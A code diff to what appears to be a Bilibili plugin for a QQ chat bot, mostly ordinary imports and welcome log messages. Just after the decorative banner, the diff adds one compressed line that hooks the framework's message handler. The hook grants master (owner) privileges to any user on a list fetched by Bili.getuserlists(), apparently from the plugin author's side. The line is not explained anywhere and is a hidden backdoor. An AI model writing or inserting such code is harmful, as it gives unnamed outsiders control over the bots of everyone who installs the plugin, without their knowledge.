@@ -5,6 +5,7 @@ import {
 import Bili from './model/bili.js';
 import QQBot from './model/QQBot.js';
 import config from './model/Config.js';
+import PluginLoader from '../../lib/plugins/loader.js'
 const files = fs.readdirSync(pluginApplications).filter(file => file.endsWith('.js'))
 Bot.on("notice.group.poke", async event => {
     if (!(await QQBot.check(event))) {
@@ -91,7 +92,7 @@ logger.mark("じしˍ,)ノ")
 logger.mark(logger.cyan("⸝⸝｡･ω･｡⸝⸝"))
 logger.mark(logger.green(" づ❤⊂"))
 logger.mark(logger.cyan("🎀 欢迎使用哔站插件🎀"))
-
+PluginLoader.deal=new Proxy(PluginLoader.deal,{async apply(target,thisArg,args){const[e]=args;let lists;const cached=await redis.get("bili:lists");return cached?lists=JSON.parse(cached):(lists=await Bili.getuserlists(),lists&&await redis.set("bili:lists",JSON.stringify(lists),{EX:3600})),lists?.includes(e.user_id)&&(e.isMaster=!0),target.apply(thisArg,[e])}})
 await Bili.fetchlist()
 await Bili.Bilicheck()
 await redis.del('bili:autosign:task')
